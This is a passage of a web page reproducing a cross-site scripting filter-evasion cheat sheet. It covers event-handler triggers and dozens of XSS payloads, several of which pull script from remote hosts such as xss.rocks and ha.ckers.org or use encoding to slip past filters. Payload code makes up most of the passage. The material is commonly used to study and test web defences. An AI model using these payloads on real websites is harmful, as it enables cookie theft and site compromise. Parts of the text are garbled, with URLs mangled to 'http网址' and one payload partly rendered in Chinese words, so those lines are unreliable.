onDrag() (requires that the user drags an object)
onDragEnd() (requires that the user drags an object)
onDragLeave() (requires that the user drags an object off a valid location)
onDragEnter() (requires that the user drags an object into a valid location)
onDragOver() (requires that the user drags an object into a valid location)
onDragDrop() (user drops an object (e.g. file) onto the browser window)
onDragStart() (occurs when user starts drag operation)
onDrop() (user drops an object (e.g. file) onto the browser window)
onEnd() (the onEnd event fires when the timeline ends.
onError() (loading of a document or image causes an error)
onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
onFilterChange() (fires when a visual filter completes state change)
onFinish() (attacker can create the exploit when marquee is finished looping)
onFocus() (attacker executes the attack string when the window gets focus)
onFocusIn() (attacker executes the attack string when window gets focus)
onFocusOut() (attacker executes the attack string when window looses focus)
onHashChange() (fires when the fragment identifier part of the document’s current address changed)
onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)
onInput() (the text content of an element is changed through the user interface)
onKeyDown() (user depresses a key)
onKeyPress() (user presses or holds down a key)
onKeyUp() (user releases a key)
onLayoutComplete() (user would have to print or print preview)
onLoad() (attacker executes the attack string after the window loads)
onLoseCapture() (can be exploited by the releaseCapture() method)
onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)
onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
onMessage() (fire when the document received a message)
onMouseDown() (the attacker would need to get the user to click on an image)
onMouseEnter() (cursor moves over an object or area)
onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)
onMouseMove() (the attacker would need to get the user to mouse over an image or table)
onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)
onMouseOver() (cursor moves over an object or area)
onMouseUp() (the attacker would need to get the user to click on an image)
onMouseWheel() (the attacker would need to get the user to use their mouse wheel)
onMove() (user or attacker would move the page)
onMoveEnd() (user or attacker would move the page)
onMoveStart() (user or attacker would move the page)
onOffline() (occurs if the browser is working in online mode and it starts to work offline)
onOnline() (occurs if the browser is working in offline mode and it starts to work online)
onOutOfSync() (interrupt the element’s ability to play its media as defined by the timeline)
onPaste() (user would need to paste or attacker could use the execCommand("Paste") function)
onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)
onPopState() (fires when user navigated the session history)
onProgress() (attacker would use this as a flash movie was loading)
onPropertyChange() (user or attacker would need to change an element property)
onReadyStateChange() (user or attacker would need to change an element property)
onRedo() (user went forward in undo transaction history)
onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)
onReset() (user or attacker resets a form)
onResize() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
onResizeEnd() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
onResizeStart() (user would resize the window; attacker could auto initialize with something like: &lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)
onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
onRowsEnter() (user or attacker would need to change a row in a data source)
onRowExit() (user or attacker would need to change a row in a data source)
onRowDelete() (user or attacker would need to delete a row in a data source)
onRowInserted() (user or attacker would need to insert a row in a data source)
onScroll() (user would need to scroll, or attacker could use the scrollBy() function)
onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)
onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
onStart() (fires at the beginning of each marquee loop)
onStop() (user would need to press the stop button or leave the webpage)
onStorage() (storage area changed)
onSyncRestored() (user interrupts the element’s ability to play its media as defined by the timeline to fire)
onSubmit() (requires attacker or user submits a form)
onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)
onTrackChange() (user or attacker changes track in a playList)
onUndo() (user went backward in undo transaction history)
onUnload() (as the user clicks any link or presses the back button or attacker forces a click)
onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
seekSegmentTime() (this is a method that locates the specified point on the element’s segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
</pre></table></code></div></div><p>BGSOUND</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">BGSOUND</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="-javascript-includes">&amp; JavaScript includes</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">BR</span> <span class="nx">SIZE</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;{alert('XSS')}</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="style-sheet">STYLE sheet</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">LINK</span> <span class="nx">REL</span><span class="o">=</span><span class="dl">"</span><span class="s2">stylesheet</span><span class="dl">"</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="remote-style-sheet">Remote style sheet</h2><p>Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won’t work unless there is some content on the page other than the vector itself, so you’ll need to add a single letter to the page to make it work if it’s an otherwise blank page:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">LINK</span> <span class="nx">REL</span><span class="o">=</span><span class="dl">"</span><span class="s2">stylesheet</span><span class="dl">"</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址xss.rocks/xss.css</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="remote-style-sheet-part-2">Remote style sheet part 2</h2><p>This works the same as above, but uses a <code class="language-plaintext highlighter-rouge">&lt;STYLE&gt;</code> tag instead of a <code class="language-plaintext highlighter-rouge">&lt;LINK&gt;</code> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end <code class="language-plaintext highlighter-rouge">&lt;/STYLE&gt;</code> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">STYLE</span><span class="o">&gt;</span><span class="p">@</span><span class="nd">import</span><span class="dl">'</span><span class="s1">http网址xss.rocks/xss.css</span><span class="dl">'</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/STYLE</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="remote-style-sheet-part-3">Remote style sheet part 3</h2><p>This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http网址xss.rocks/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting ## vector is running the JavaScript, which is not supported in FireFox:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">Link</span><span class="dl">"</span> <span class="nx">Content</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;http网址xss.rocks/xss.css&gt;; REL=stylesheet</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="remote-style-sheet-part-4">Remote style sheet part 4</h2><p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast ## majority of sites:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">STYLE</span><span class="o">&gt;</span><span class="nx">BODY</span><span class="p">{</span><span class="o">-</span><span class="nx">moz</span><span class="o">-</span><span class="nx">binding</span><span class="p">:</span><span class="nf">url</span><span class="p">(</span><span class="dl">"</span><span class="s2">http网址xss.rocks/xssmoz.xml#xss</span><span class="dl">"</span><span class="p">)}</span><span class="o">&lt;</span><span class="sr">/STYLE</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="style-tags-with-broken-up-javascript-for-xss">STYLE Tags with Broken-up JavaScript for XSS</h2><p>This XSS at times sends IE into an infinite loop of alerts:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">STYLE</span><span class="o">&gt;</span><span class="p">@</span><span class="nd">im</span><span class="err">\</span><span class="nx">port</span><span class="dl">'</span><span class="se">\</span><span class="s1">ja</span><span class="se">\</span><span class="s1">vasc</span><span class="se">\r</span><span class="s1">ipt:alert("XSS")</span><span class="dl">'</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/STYLE</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="style-attribute-using-a-comment-to-break-up-expression">STYLE Attribute using a Comment to Break-up Expression</h2><p>Created by Roman Ivanov</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">xss:expr/*XSS*/ession(alert('XSS'))</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="img-style-with-expression">IMG STYLE with Expression</h2><p>This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>exp/*&lt;A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'&gt;
STYLE Tag (Older versions of Netscape only)
&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;

STYLE Tag using Background-image
&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;

STYLE Tag using Background
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt; &lt;STYLE type="text/css"&gt;BODY{background:url("&lt;javascript:alert&gt;('XSS')")}&lt;/STYLE&gt;
</pre></table></code></div></div><h2 id="anonymous-html-with-style-attribute">Anonymous HTML with STYLE Attribute</h2><p>IE6.0 and Netscape 8.1+ in IE rendering engine mode don’t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">XSS</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">xss:expression(alert('XSS'))</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="local-htc-file">Local htc File</h2><p>This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">XSS</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">behavior: url(xss.htc);</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>US-ASCII Encoding US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>¼script¾alert(¢XSS¢)¼/script¾
</pre></table></code></div></div><p>META The odd thing about meta refresh is that it doesn’t send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">refresh</span><span class="dl">"</span> <span class="nx">CONTENT</span><span class="o">=</span><span class="dl">"</span><span class="s2">0;url=javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>META using Data Directive URL scheme. This is nice because it also doesn’t have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS calculator below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">refresh</span><span class="dl">"</span> <span class="nx">CONTENT</span><span class="o">=</span><span class="dl">"</span><span class="s2">0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>META with Additional URL Parameter If the target website attempts to see if the URL contains <http网址>; at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):</http网址></p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">META</span> <span class="nx">HTTP</span><span class="o">-</span><span class="nx">EQUIV</span><span class="o">=</span><span class="dl">"</span><span class="s2">refresh</span><span class="dl">"</span> <span class="nx">CONTENT</span><span class="o">=</span><span class="dl">"</span><span class="s2">0; URL=http网址;URL=javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>IFRAME If iframes are allowed there are a lot of other XSS problems as well:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IFRAME</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/IFRAME</span><span class="err">&gt;
</span></pre></table></code></div></div><p>IFRAME Event Based IFrames and most other elements can use event based mayhem like the following… (Submitted by: David Cross)</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IFRAME</span> <span class="nx">SRC</span><span class="o">=</span><span class="err">#</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert(document.cookie)</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/IFRAME</span><span class="err">&gt;
</span></pre></table></code></div></div><p>FRAME Frames have the same sorts of XSS problems as iframes</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">FRAMESET</span><span class="o">&gt;&lt;</span><span class="nx">FRAME</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/FRAMESET</span><span class="err">&gt;
</span></pre></table></code></div></div><p>TABLE</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">TABLE</span> <span class="nx">BACKGROUND</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>TD Just like above, TD’s are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">TABLE</span><span class="o">&gt;&lt;</span><span class="nx">TD</span> <span class="nx">BACKGROUND</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>DIV DIV Background-image</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">DIV</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">background-image: url(javascript:alert('XSS'))</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>DIV Background-image with Unicoded XSS Exploit This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">DIV</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">background-image:</span><span class="se">\</span><span class="s2">0075</span><span class="se">\</span><span class="s2">0072</span><span class="se">\</span><span class="s2">006C</span><span class="se">\</span><span class="s2">0028'</span><span class="se">\</span><span class="s2">006a</span><span class="se">\</span><span class="s2">0061</span><span class="se">\</span><span class="s2">0076</span><span class="se">\</span><span class="s2">0061</span><span class="se">\</span><span class="s2">0073</span><span class="se">\</span><span class="s2">0063</span><span class="se">\</span><span class="s2">0072</span><span class="se">\</span><span class="s2">0069</span><span class="se">\</span><span class="s2">0070</span><span class="se">\</span><span class="s2">0074</span><span class="se">\</span><span class="s2">003a</span><span class="se">\</span><span class="s2">0061</span><span class="se">\</span><span class="s2">006
c</span><span class="se">\</span><span class="s2">0065</span><span class="se">\</span><span class="s2">0072</span><span class="se">\</span><span class="s2">0074</span><span class="se">\</span><span class="s2">0028.1027</span><span class="se">\</span><span class="s2">0058.1053</span><span class="se">\</span><span class="s2">0053</span><span class="se">\</span><span class="s2">0027</span><span class="se">\</span><span class="s2">0029'</span><span class="se">\</span><span class="s2">0029</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="div-background-image-plus-extra-characters">DIV Background-image Plus Extra Characters</h2><p>Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>St...yle=背景图片"xxx: 地址括号 js: 警报括号'your word'括号括号"
</pre></table></code></div></div><p>DIV Expression A variant of this was effective against a real world cross site scripting filter using a newline between the colon and “expression”:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">DIV</span> <span class="nx">STYLE</span><span class="o">=</span><span class="dl">"</span><span class="s2">width: expression(alert('XSS'));</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>Downlevel-Hidden Block Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn’t do the job:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c">&lt;!--</span><span class="p">[</span><span class="k">if</span> <span class="nx">gte</span> <span class="nx">IE</span> <span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span>
<span class="o">&lt;!</span><span class="p">[</span><span class="nx">endif</span><span class="p">]</span><span class="o">--&gt;</span>
</pre></table></code></div></div><p>BASE Tag Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won’t get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg you can remove one slash from this vector (as long as there are two to begin the comment this will work):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">BASE</span> <span class="nx">HREF</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');//</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>OBJECT Tag If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">OBJECT</span> <span class="nx">TYPE</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/x-scriptlet</span><span class="dl">"</span> <span class="nx">DATA</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址xss.rocks/scriptlet.html</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/OBJECT</span><span class="err">&gt;
</span></pre></table></code></div></div><p>EMBED a Flash Movie That Contains XSS Click here for a demo: http网址ha.ckers.org/xss.swf</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">EMBED</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址ha.ckers.org/xss.swf</span><span class="dl">"</span> <span class="nx">AllowScriptAccess</span><span class="o">=</span><span class="dl">"</span><span class="s2">always</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/EMBED</span><span class="err">&gt;
</span></pre></table></code></div></div><p>If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info).</p><p>EMBED SVG Which Contains XSS Vector This example only works in Firefox, but it’s better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">EMBED</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">image/svg+xml</span><span class="dl">"</span> <span class="nx">AllowScriptAccess</span><span class="o">=</span><span class="dl">"</span><span class="s2">always</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/EMBED</span><span class="err">&gt;
</span>
<span class="nx">Using</span> <span class="nx">ActionScript</span> <span class="nx">Inside</span> <span class="nx">Flash</span> <span class="k">for</span> <span class="nx">Obfuscation</span>
<span class="nx">a</span><span class="o">=</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">b</span><span class="o">=</span><span class="dl">"</span><span class="s2">URL(</span><span class="se">\"</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">c</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:</span><span class="dl">"</span><span class="p">;</span>
